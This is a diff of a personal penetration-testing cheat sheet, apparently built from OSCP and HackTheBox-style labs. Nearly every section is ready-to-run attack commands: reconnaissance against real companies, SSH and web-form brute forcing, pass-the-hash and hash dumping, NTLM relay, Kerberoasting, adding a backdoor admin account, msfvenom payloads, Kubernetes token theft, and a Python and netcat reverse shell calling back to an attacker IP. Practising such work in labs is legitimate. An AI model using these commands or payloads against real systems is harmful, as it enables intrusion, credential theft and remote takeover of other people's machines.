@@ -1,4 +1,6 @@
-----------------------------------------------------------------LINUX-------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
+LINUX
+----------------------------------------------------------------------------------------------------
 systemctl <status/start/stop> <ssh/apache2>
 systemctl <enable/disable> <ssh/apache2> - for boot persistance
 netstat -tulpn (only listening sockets) / netstat -tuapn
@@ -9,34 +11,83 @@ cat access_log.txt | uniq -c - count similar lines
 
 Eliminating spaces before cut-ing:
 cat file | tr -s ' ' | cut -d ' ' -f 8
-Removing stuff:
-cat file | tr -d ':'
 
 ;Bash for loop example:
-for username in $(cat /usr/share/wordlists/fern-wifi/common.txt); do python cve_2018_15473_confirmed.py 10.x.x.x $username; done
+for username in $(cat /usr/share/wordlists/fern-wifi/common.txt); do python cve_2018_15473_confirmed.py 10.91.49.86 $username; done
 
------------------------------------------------------------------BASH------------------------------------------------------------------------------------------
+BASH rules
 1) Dont forget spaces inside the if condition
 2) A big no-no when assigning a variable - no spaces allowed
 3) $var might not work inside single quotes - try double quotes
 
 
 
--------------------------------------------------------------------RECON---------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
+RECON
+----------------------------------------------------------------------------------------------------
+breachParse:
+./breach-parse.sh @tesla.com tesla.txt
+
 Google Hacks:
-site:amazon.com -site:www.amazon.com
+site:blackberry.com -site:www.blackberry.com
+site:tesla.com -www
 intitle:"netbotz appliance" -filetype:pdf
+site:tesla.com filetype:csv
 
 theHarvester:
-(from theHarvester git repo - this is v3) python3 theHarvester.py -d watchdox.com -b yahoo
+python3 theHarvester.py -d watchdox.com -b yahoo
+theHarvester -d tesla.com -b google -l 100
+
+DNS:
+gobuster -m dns -t 100 -u google.com -w /usr/share/wordlists/metasploit/namelist.txt
+
+sublist3r:
+sublist3r -d tesla.com
+
+OWASP Amass:
+amass intel -whois -d mfa.tesla.com
+
+Whatweb:
+whatweb -v https://blackberry.com
 
 Shodan
 shodan init <APIKEY> (from your account)
-shodan host amazon.com
+shodan host blackberry.watchdox.com
 shodan search 
--------------------------------------------------------------ENUMERATION-----------------------------------------------------------------------------------
-DNS:
-gobuster -m dns -t 100 -u google.com -w /usr/share/wordlists/metasploit/namelist.txt
+
+
+----------------------------------------------------------------------------------------------------
+ENUMERATION
+----------------------------------------------------------------------------------------------------
+Network discovery:
+netdiscover -r 10.10.10.10/24
+arp-scan --localnet 
+	sometimes --interface tun0
+
+
+SMB:
+nbtscan to scan through the range:
+nbtscan -r 10.23.58.0/24
+
+Next, make sure you did nmap with -A - that will involve all basic snb scripts
+nmap -A -p139,445 10.10.10.40
+the next line runs the same scripts on smb as -A (With nmap --scripts=smb-protocol* didnt work on Kioptrix, but -sC works great)
+nmap -v -p111,137,139,23768 10.23.58.51 -sC
+
+then, see ig there are any vulns popping up:
+nmap --script smb-vuln* -p 139,445 10.10.10.40
+
+Now to enumerate shares with smbclient:
+smbclient -L \\\\\\10.23.58.51
+
+With smbmap (never worked for me):
+smbmap -H 10.23.58.51 -P 137 -d KIOPTRIX (by default would connect to 445)
+this one worked on Blue, but only with port specified and didnt work without port:
+smbmap -H 10.10.10.40 -p 139
+
+With enum4linux - last resort, this one just dumps everything that it can, pretty messy:
+enum4linux -a 10.23.58.51
+
 
 SMTP:
 user enumeration:
@@ -48,9 +99,33 @@ smtp-user-enum -M VRFY -u root -t 192.168.2.4
 Automation across the network:
 python ~/exploits/smtp/smtp_scanner.py -U /usr/share/wordlists/g00fb4ll/usernames.txt -T targetlist.txt
 
-OpenSSH:
+
+SSH:
+First always try to merely connect with "ssh <targetip>"
+If the alg too old try this:
+ssh 10.23.58.51 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1
+if now complaining about matching cipher then do this:
+ssh 10.23.58.51 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -c aes128-cbc
+
 cve-2018-15473:
-python cve_2018_15473_confirmed.py --userList /usr/share/wordlists/g00fb4ll/usernames.txt 10.x.x.x --outputFile out
+python cve_2018_15473_confirmed.py --userList /usr/share/wordlists/g00fb4ll/usernames.txt 10.90.78.29 --outputFile out
+or even smarter:
+python ~/git/exploits/openssh/cve_2018_15473_confirmed.py --userList /usr/share/wordlists/g00fb4ll/usernames.txt 10.23.58.51 --outputFile out
+and then
+cat out | grep -w valid
+
+
+FTP:
+nmap -T4 -p21 10.10.10.5 -sC
+then
+nmap -T4 -p21 10.10.10.5 --script=ftp-anon
+nmap -T4 -p21 10.10.10.5 --script=ftp-syst
+then if unsafe
+nmap -T4 -p21 10.10.10.5 --script-args=unsafe=1 --script=ftp-vuln*
+
+Try connecting with anonymous through browser:
+ftp://anonymous:anonymous@10.10.10.5
+However, remember that anonymous doesnt display all the options that "ls -la" does, so its important to do this with terminal client.
 
 SNMP:
 nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt
@@ -74,50 +149,393 @@ root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
 
 Enumerating Installed Software:
 root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
-------------------------------------------------------------------NMAP------------------------------------------------------------------------------------------
+
+
+----------------------------------------------------------------------------------------------------
+NMAP
+----------------------------------------------------------------------------------------------------
 Parameters:
--A
--O
--T1..5
--p-
+-A - get version, OS, fingerprinting etc.
+-O - OS, already included within -A
+-T1..5 - best to do -T4
+-p- - scan all ports
+-sS - stealth mode with RST before final ACK
 
 Comprehensive scan:
-nmap -sS -sU -T4 -A -vv -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script="default or (discovery and safe)" 10.x.x.x
+nmap -sS -sU -T4 -A -vv -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script="default or (discovery and safe)" 10.10.10.150
+
+Heath scan for TCP:
+nmap -T4 -p- -A <targetip>
+or to save time run without -A and then  
+nmap -T4 -pX -A <targetip> once the X are known
+
+Heath scan for UDP - do only top 1000 ports and no -A because UDP takes loooong time (you can do -A later once the ports are known):
+nmap -v -sU -T4 --top-ports 1000 <targetip> (-v to track the progress)
+
+Applying relevant scripts without listing:
+nmap -v -p111,137,139,32768 10.23.58.51 -sC
 
 Through the proxy:
 nmap --proxy http://192.168.233.150:3128 -Pn 192.168.233.150
 
------------------------------------------------------------------WEB SCAN--------------------------------------------------------------------------------------
+
+----------------------------------------------------------------------------------------------------
+MASSCAN
+----------------------------------------------------------------------------------------------------
+masscan -p1-65535 --rate 1000 10.23.58.51
+
+
+----------------------------------------------------------------------------------------------------
+WEB SCAN
+----------------------------------------------------------------------------------------------------
 dirbuster
 or
-gobuster -e -k -u http://10.23.58.40:31982/ -w /usr/share/wordlists/g00fb4ll/dirbuster_directory-list-2.3-medium.txt -x php,html
+gobuster dir -e -k -u http://10.23.58.40:31982/ -w /usr/share/wordlists/g00fb4ll/dirbuster_directory-list-2.3-medium.txt -x php,html
 (-e - extended mode, print full urls; -k - skip SSL cert verification)
 or - gobuster for a list of targets/ports
-for port in $(cat ports.txt); do gobuster -e -k -u <hostname>:$port/ -w /usr/share/wordlists/dirb/common.txt; done
+for port in $(cat ports.txt); do gobuster -e -k -u http://rmacaulay14uos1.devlab2k.testnet.rim.net:$port/ -w /usr/share/wordlists/dirb/common.txt; done
 
-Fuzzing for path traversal:
+Testing for shellshock:
+python shocker.py -H 10.10.10.75
+or
+wfuzz -v -c -H "User-agent: () { :;}; echo; echo vulnerable" --ss vulnerable -t 50 -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt http://10.10.10.75/FUZZ
 
 
------------------------------------------------------------------PASSWORDS------------------------------------------------------------------------------------
+
+----------------------------------------------------------------------------------------------------
+PASSWORDS
+----------------------------------------------------------------------------------------------------
 Running cewl on site page:
 cewl http://10.10.10.150:80 -m 4 -d 3 --with-numbers --meta -v -w curling_wordlist.txt
 (-m is minimal word length, -d is the spider depth, -a is parsing the meta as well)
+This would work on Nibbles machine because the password is nibbles and "nibbles" is actually in the cewl produced list. One problem is that there is a blacklist protection after 3 paswords.
 
 Mutating with John:
 john --wordlist=curling_wordlist.txt --rules --stdout > mutated.txt
 
 RDP bruteforcing:
-ncrack -vv --user offsec -P password-file.txt rdp://10.x.x.x
+ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35
 
 SSH:
-hydra -l root -P password-file.txt 10.11.1.219 ssh
-medusa -u root -P /usr/share/wordlists/g00fb4ll/top-1000-passwords.txt -h 10.x.x.x -M ssh -t 5
+hydra -v -l root -P password-file.txt 10.11.1.219 ssh -t 4
+hydra -v -l harold -P /usr/share/wordlists/g00fb4ll/top-1000-passwords.txt 10.23.58.51 ssh -t 4
+medusa -u root -P /usr/share/wordlists/g00fb4ll/top-1000-passwords.txt -h 10.90.78.29 -M ssh -t 5
+or
+use msf with module auxiliary/scanner/ssh/ssh_login - same functionality
 
 HTTP forms:
-hydra -P password-file.txt -v 10.11.1.219 snmp
+hydra -l prtgadmin -P /usr/share/wordlists/g00fb4ll/top-1000-passwords.txt 10.10.10.152 http-get-form "/public/checklogin.htm:loginurl=&username=^USER^&password=^PASS^:failed"
+hydra -l prtgadmin -P /usr/share/wordlists/g00fb4ll/top-1000-passwords.txt 10.10.10.152 -t 5 -w 10 http-post-form "/public/checklogin.htm:loginurl=&username=^USER^&password=^PASS^:failed" -V
+
+PASS THE PASSWORD:
+After retrieving ANY pwd lets see where it fits:
+	crackmapexec 10.23.58.0/24 -u arubenstein -d OPERA.local -p violin123!
+If we see any (Pwn3d!) we can follow up with psexec or try and dump sams:
+	psexec.py opera/arubenstein:violin123\!@10.23.58.53
+	crackmapexec 10.23.58.0/24 -u arubenstein -d OPERA.local -p violin123! --sam
+Warning: password spraying is a last resort but only on local admins, since they usually dont have lockout policy
+
+DUMPING HASHES:
+	secretsdump.py opera/arubenstein:violin123\!@10.23.58.71
+
+HASHCRACKING
+Ntlmv2 (from reponder):
+	hashcat -m 5600 ntlm2hash.txt --force /usr/share/wordlists/rockyou.txt
+Ntlm (SAM hashes from from secretsdump):
+	hashcat -m 1000 ntlmhash.txt --force /usr/share/wordlists/rockyou.txt
+
+PASS THE HASH: (only for NTLM hashes! NTLMv2 can't b passed)
+After getting second part of NTLM (SAM) hash:
+	crackmapexec 10.23.58.0/24 -u IEUser -H fc525c9683e8fe067095ba2ddc971889 --local
+Next you can also try PTH to psexec:
+	psexec.py IEUser@10.23.58.53 -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
+	
+----------------------------------------------------------------------------------------------------
+METASPLOIT
+----------------------------------------------------------------------------------------------------
+Exploits:
+search <software>
+use <number> - instead of typing the module name just type the number as it appears in the search results
+
+Useful post commands:
+getuid - like whoami
+sysinfo - gives all relevant system info
+getsystem - try to elevate your privs if you are not a root
+hashdump - dump hashes
+shell - drop into the shell
+
+INCOGNITO - tool for token impersonation:
+	Impersonation tokens - for logged in users / rdp
+	Delegation tokens - for
+Once in meterpreter session:
+	load incognito
+	list_token -u / -g
+	impersonate_token <user> - impersonation only works until the computer retarted
+
+----------------------------------------------------------------------------------------------------
+POST
+----------------------------------------------------------------------------------------------------
+Meterpreter Useful post commands:
+getuid - like whoami
+sysinfo - gives all relevant system info
+getsystem - try to elevate your privs if you are not a root
+(windows) hashdump - dump hashes
+ps
+load kiwi => help => creds all, lsa dump secrets, lsa dump hash
+load incognito => help => list tokens -u
+shell - drop into the shell
+
+Windows shell useful commands:
+whoami
+whoami /priv
+net users
+echo %username%
+net localgroup
+net localgroup Administrators
+hostname
+route print
+arp -a
+netstat -ano
+type C:\WINDOWS\System32\drivers\etc\hosts
+
+TTY escape sequences to improve the shell from dollarsign:
+python -c 'import pty; pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl —e 'exec "/bin/sh";'
+lua: os.execute('/bin/sh')
 
 
---------------------------------------------------------------------PAYLOADS----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
+FILE TRANSFER
+----------------------------------------------------------------------------------------------------
+Downloading initial payload after getting basic RCE:
+wget http://10.23.58.43:8000/kubectl -O kubectl
+wget http://10.23.58.43:8000/msbin -O msbin
+curl -O http://10.23.58.43:8000/kubectl
+curl -O http://10.23.58.43:8000/msbin
+curl http://10.23.58.43:8000/kubectl -o kubectl
+curl http://10.23.58.43:8000/kubectl -o msbin
+
+
+Heath method to transfer file to windows from attacker server:
+certutil -urlcache -f http://10.10.14.47/sherlock.ps1 sherlock.ps1
+powershell -ExecutionPolicy Bypass -Command "& {Import-Module .\sherlock.ps1; Find-AllVulns}"
+
+
+Reverse shell without traditional nc that supports -e option:
+mknod /tmp/backpipe p
+/bin/sh 0</tmp/backpipe | nc <attacker_ip> <attacker_port> 1>/tmp/backpipe
+
+
+VBScript on the Windows victim (2000, XP and 2003):
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+and then:
+cscript wget.vbs http://10.10.14.47/sherlock.ps1 sherlock.ps1
+
+
+Powershell on Windows victim
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.10.14.47/sherlock.ps1" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+and then:
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+
+----------------------------------------------------------------------------------------------------
+IMPACKET
+----------------------------------------------------------------------------------------------------
+Its important to try all of them in this prder:
+smbexec.py pentest:"P3nT3st!"@10.10.10.152
+wmiexec.py pentest:"P3nT3st!"@10.10.10.152
+psexec.py pentest:"P3nT3st!"@10.10.10.152
+	f.e. psexec worked oin real win10 machine with Defender turned off where others wouldn't. But in general psexec more AV-noisy than wmiexec and smbexec
+
+
+----------------------------------------------------------------------------------------------------
+ACTIVE DIRECTORY
+----------------------------------------------------------------------------------------------------
+LLMNR poisoning
+responder -I eth0 -rdwv (stop apache on port 80 first)
+
+HASHCRACKING (for NTLMv2)
+hashcat -m 5600 ntlm2hash.txt --force /usr/share/wordlists/rockyou.txt
+
+SMB relay attack (SMB signing must be disabled and relayed creds should be admin on the relayed machine):
+1) nmap 10.23.58.0/24 -p445 --script=smb2-security-mode --open | grep "not required" -B10 | grep "Nmap scan report" | cut -d" " -f5
+2) providing the list of machins with "smb signing enabled but not required" generate targets.txt
+3) Go to /usr/share/responder/Responder.conf and turn of HTTP and SMB
+4) Start responder: responder -I eth0 -rdwv 
+5) Start ntlmrelay: ntlmrelayx.py -tf targets.txt -smb2support
+	hashes are automatically stored in IP.hashes in the same dir
+or
+ntlmrelayx.py -tf targets.txt -smb2support -i
+to try and start the interactive shell 
+	([*] Started interactive SMB client shell via TCP on 127.0.0.1:11000)
+	nc 127.0.0.1 11000
+	help
+	shares
+	use C$
+	use ADMIN$
+or 
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+or
+ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
+	where paylod.exe can be a met shell msfvenom-generated payload
+
+MITM IPv6:
+1) Start mitm service: mitm6 -d opera.local
+2) Start relay service: ntlmrelayx.py -6 -t ldaps://10.23.58.65 -wh fakewpad.opera.local -l lootme
+	where IP is the ip of the DC
+3) cd lootme and inspect the loot
+
+
+POWERVIEW - great tool for internal enumeration on Windows network:
+1) this script has to run from the compromised windows achine that is part of the domain
+2) powershell -ep bypass
+3) . .\PowerView.ps1
+4) Now we can do various commands:
+	get-netdomain
+	get-netdomaincontroller
+	get-domainpolicy
+	(get-domainpolicy)."systemaccess" - to zoom on system access policy
+	get-netuser (look descriptions for password, when was the last login)
+	get-netuser | select description
+	get-netuser | select cn
+	get-userproperty -Properties pwdlastset
+	get-userproperty -Properties logoncount
+	get-userproperty -Properties badpwdcount
+	get-netcomputer
+	get-netcomputer -FullData
+	Get-NetComputer | select operatingsystem
+	get-netgroup
+	get-netgroup -GroupName "Domain Admins"
+	get-netgpo
+	get-netgpo | select displayname whenchanged
+	Invoke-ShareFinder 
+		to list all the shares
+
+BLOODHOUND
+	On compromised Windows machine:
+	powershell -ep bypass
+	Invoke-BloodHound -CollectionMethod All -Domain OPERA.local -ZipFileName info.zip
+	Then upload this file into bloodhound on Kali and observe network architecture
+
+
+KERBEROASTING
+Getting hashes with any user that we have:
+	GetUserSPNs.py opera.local/arubenstein:violin123! -dc-ip 10.23.58.77 -request
+and then with the above hash in hash_tgs.txt file:
+	hashcat -m 13100 hash_tgs.txt --force /usr/share/wordlists/rockyou.txt
+	
+	
+----------------------------------------------------------------------------------------------------
+PRIVESC
+----------------------------------------------------------------------------------------------------
+LINUX:
+
+Scripts:
+/git/exploits/linenum.sh: ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+/git/exploits/linuxprivchecker.py: python linuxprivchecker.py
+
+1) history - shows history of user commands
+   cat .bash_history
+
+2) sudo -l
+	what can we execute with sudo that runs with root privileges? => look for any escape sequences
+   sudo su - (to switch to root)
+   sudo -u anotheruser bash
+   sudo su anotheruser
+
+3) ps -aux | grep root
+	what runs as root and are there any writable services/files there for us?
+
+4) find / -perm -u=s -type f 2>/dev/null
+	What runs with permissions of the current owner? => look for 
+
+5) ps aux - check what commads / processes root is running like in "Bashed" - run all python scripts from /scripts dir that other users can write to
+
+
+LINUX KERNEL:
+uname -a => google for "privilege escalation 4.4.0-104-generic"
+
+Run sudo killer to look for sudo misconfigurations:
+./sudo_killer.sh -c -e -r report.txt -p /tmp
+
+
+WINDOWS:
+whoami => net user <username> - to see the groups current user participates in
+net user g00fb4ll g00fb4ll /add
+net localgroup Administrators g00fb4ll /add
+
+systeminfo => look for missing KBs
+
+Using sherlock to find local vulns:
+	On windows victim:
+	certutil -urlcache -f http://10.10.14.47/sherlock.ps1 sherlock.ps1
+	powershell -ExecutionPolicy Bypass -Command "& {Import-Module .\sherlock.ps1; Find-AllVulns}"
+
+Using watson to find local vulns:
+	TBD
+
+Using windows-exploit-suggester:
+	python windows-exploit-suggester.py --update
+	./windows-exploit-suggester.py --database 2020-08-18-mssb.xls --systeminfo win7sp1-systeminfo.txt
+		where xls is the file generated by update process and .txt is the file about the system 			under attack
+	./windows-exploit-suggester.py --database 2020-08-18-mssb.xls --systeminfo optimum-systeminfo.txt
+	potential other flags --verbose and --local (to show only local exploits)
+
+
+----------------------------------------------------------------------------------------------------
+BO AND EXPLOIT DEVELOPMENT
+----------------------------------------------------------------------------------------------------
+Spiking - finding the input/command that will crash the server (on vulnserver Win10):
+generic_send_tcp 10.23.58.52 9999 vulnserver_rtime.spk 0 0
+
+Fuzzing:
+use send_buf.py
+
+Don't forget: bad chars, 86/64-bit system/program, leave space (32?) for NOPs i.e NOP sled + try both python nd c formates for python script
+
+
+Imunity commands:
+1) File -> Attach
+2) Run
+3) !mona modules - to show what dlls are loaded 
+4) !mona find -s '\xff\xe4' -m essfunc.dll (see nasm shell for jmp esp below)
+5) insert return address as mona-found address in a reverse order
+
+----------------------------------------------------------------------------------------------------
+PAYLOADS
+----------------------------------------------------------------------------------------------------
 Setting up unique string:
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3A...
@@ -132,6 +550,10 @@ nasm > jmp esp
 00000000 FFE4 jmp esp
 nasm >
 
+Listing payloads:
+msfvenom --list payloads
+msfvenom --list format
+
 Reverse tcp meterpreter piggybacking on some program:
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
 
@@ -139,23 +561,26 @@ Reverse HTTPS meterpreter:
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe
 -b - specifying disallowed characters
 
---------------------------------------------------------------------FILE TRANSFER-----------------------------------------------------------------------------------
-Downloading initial payload after getting basic RCE:
-wget http://10.23.58.43:8000/kubectl -O kubectl
-wget http://10.23.58.43:8000/msbin -O msbin
-curl -O http://10.23.58.43:8000/kubectl
-curl -O http://10.23.58.43:8000/msbin
-curl http://10.23.58.43:8000/kubectl -o kubectl
-curl http://10.23.58.43:8000/kubectl -o msbin
+Reverse JSP shell wrapped into WAR (worked on Jerry):
+msfvenom -p java/jsp_shell_reverse_tcp LPORT=4444 LHOST=10.10.14.47 --platform windows --format war -o shell_java.war
+
+ASPX reverse shell:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.aspx
+
+Raw ASCII payload:
+msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=4444 > shellcode
+
+Python reverse shell:
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.47",444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 
 
----------------------------------------------------------------------PRIVESC----------------------------------------------------------------------------------------
-
-Run sudo killer to look for sudo misconfigurations:
-./sudo_killer.sh -c -e -r report.txt -p /tmp
-
-
---------------------------------------------------------------------ATTACKING KUBERNETES----------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
+ATTACKING KUBERNETES
+----------------------------------------------------------------------------------------------------
 meterpreter> upload /var/www/html/payloads_for_download/kubectl_64bit
 cat /run/secrets/kubernetes.io/namespace
 cat /run/secrets/kubernetes.io/token
